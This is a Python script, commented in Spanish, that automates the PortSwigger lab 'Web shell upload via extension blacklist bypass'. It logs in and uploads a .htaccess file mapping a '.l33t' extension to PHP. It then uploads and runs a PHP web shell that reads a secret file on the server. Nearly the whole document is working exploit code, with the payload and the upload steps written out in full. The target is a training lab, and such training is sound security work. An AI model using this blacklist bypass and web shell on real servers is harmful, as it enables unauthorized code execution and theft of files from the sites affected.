#!/usr/bin/env python3
"""
File Upload -> Web shell via EXTENSION BLACKLIST BYPASS (.htaccess + .l33t)
==========================================================================
Lab PortSwigger: "Web shell upload via extension blacklist bypass".

El servidor rechaza subir extensiones ejecutables (.php, .phtml, ...) con una
LISTA NEGRA, pero NO bloquea el fichero .htaccess. Idea:

  1. Login como wiener:peter.
  2. Subir un .htaccess con:   AddType application/x-httpd-php .l33t
     -> Apache ejecutara como PHP cualquier fichero .l33t de esa carpeta
        (/files/avatars/). ".l33t" es "leet" (letra l + 33t): una pseudo-extension
        que NO esta en la lista negra, pero que ya mapeamos a PHP.
  3. Subir exploit.l33t con el payload PHP. Pasa el filtro (extension permitida) y
     se EJECUTA como PHP por el .htaccess.
  4. GET /files/avatars/exploit.l33t -> el PHP corre y devuelve el contenido de
     /home/carlos/secret.
  5. Enviar el secreto con el boton del banner del lab.

Por que funciona el .htaccess:
  - Apache lee .htaccess por directorio. AddType asocia un Content-Type/handler a
    una extension. Al mapear .l33t a application/x-httpd-php, el modulo PHP procesa
    esos ficheros. La lista negra solo mira la extension del NOMBRE subido, no el
    efecto del .htaccess.

Requisito:  pip install requests

Uso:
    python webshell_blacklist_bypass.py
Cambia BASE por la URL de tu lab.
"""
import re
import sys

import requests

# --- CONFIGURACION ---------------------------------------------------------
BASE = "https://YOUR-LAB-ID.web-security-academy.net"   # <-- cambia por tu lab
USER = "wiener"
PASSWORD = "peter"

EXT = ".l33t"                       # pseudo-extension NO bloqueada (leet: l+33t)
UPLOAD_PATH = "/my-account/avatar"  # endpoint del formulario de avatar
SERVE_DIR = "/files/avatars"        # donde quedan servidos los ficheros subidos
SECRET_FILE = "/home/carlos/secret" # fichero que leera el web shell

# Payload PHP que imprime el secreto (igual que file-vulnerabilities/exploit.php).
PHP_PAYLOAD = f"<?php echo file_get_contents('{SECRET_FILE}'); ?>"
# Contenido del .htaccess: mapea la pseudo-extension a PHP.
HTACCESS = f"AddType application/x-httpd-php {EXT}\n"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36")

# Sesion unica: mantiene la cookie de sesion entre login y subidas. NO fijamos
# Content-Type global: requests lo pone solo (urlencoded en el login, multipart
# en las subidas). Si lo fijaramos, romperia el multipart.
s = requests.Session()
s.headers.update({"User-Agent": UA})

CSRF_RE = re.compile(r'name="csrf"\s+value="([^"]+)"')


def get_csrf(path):
    """Lee el token CSRF fresco del HTML de la pagina indicada."""
    html = s.get(BASE + path).text
    m = CSRF_RE.search(html)
    if not m:
        raise RuntimeError(f"No se encontro el CSRF en {path}. Sesion caducada?")
    return m.group(1)


def login():
    """Autentica como wiener:peter usando el CSRF del formulario de login."""
    csrf = get_csrf("/login")
    r = s.post(BASE + "/login",
               data={"csrf": csrf, "username": USER, "password": PASSWORD})
    if "/my-account" not in r.url and "Log out" not in r.text:
        raise RuntimeError("Login fallido. Revisa credenciales/BASE.")
    print(f"[1] Login OK como {USER}")


def upload(filename, content, content_type="text/plain"):
    """Sube un fichero por el formulario de avatar (multipart). Devuelve la
    respuesta. Campos del form: avatar (fichero), user, csrf."""
    csrf = get_csrf("/my-account")
    files = {"avatar": (filename, content, content_type)}
    data = {"user": USER, "csrf": csrf}
    r = s.post(BASE + UPLOAD_PATH, files=files, data=data)
    ok = r.status_code in (200, 302) and "too large" not in r.text.lower()
    marca = "OK" if ok else f"?? ({r.status_code})"
    print(f"    subida '{filename}' -> {marca}")
    return r


def main():
    if "YOUR-LAB-ID" in BASE:
        sys.exit("[!] Edita BASE con la URL de tu lab antes de ejecutar.")

    print(f"[*] File upload blacklist bypass  ->  {BASE}")
    login()

    # 2) Subir el .htaccess que mapea EXT a PHP.
    print(f"[2] Subiendo .htaccess (AddType application/x-httpd-php {EXT})")
    upload(".htaccess", HTACCESS)

    # 3) Subir el web shell con la pseudo-extension permitida.
    shell_name = "exploit" + EXT
    print(f"[3] Subiendo web shell '{shell_name}' con el payload PHP")
    upload(shell_name, PHP_PAYLOAD)

    # 4) Ejecutar el shell pidiendo el fichero servido.
    shell_url = BASE + SERVE_DIR + "/" + shell_name
    print(f"[4] Ejecutando el shell: GET {SERVE_DIR}/{shell_name}")
    r = s.get(shell_url)
    if r.status_code != 200:
        sys.exit(f"[!] El shell devolvio {r.status_code}. El .htaccess no se aplico?"
                 f" Respuesta: {r.text[:200]!r}")
    if "<?php" in r.text:
        sys.exit("[!] El servidor devolvio el PHP SIN ejecutar (texto plano). El "
                 ".htaccess no esta surtiendo efecto.")

    secret = r.text.strip()
    print("\n" + "=" * 60)
    print(f">> SECRETO de {SECRET_FILE}:\n\n    {secret}\n")
    print("=" * 60)
    print("[i] Pega este secreto en 'Submit solution' del banner del lab.")


if __name__ == "__main__":
    main()
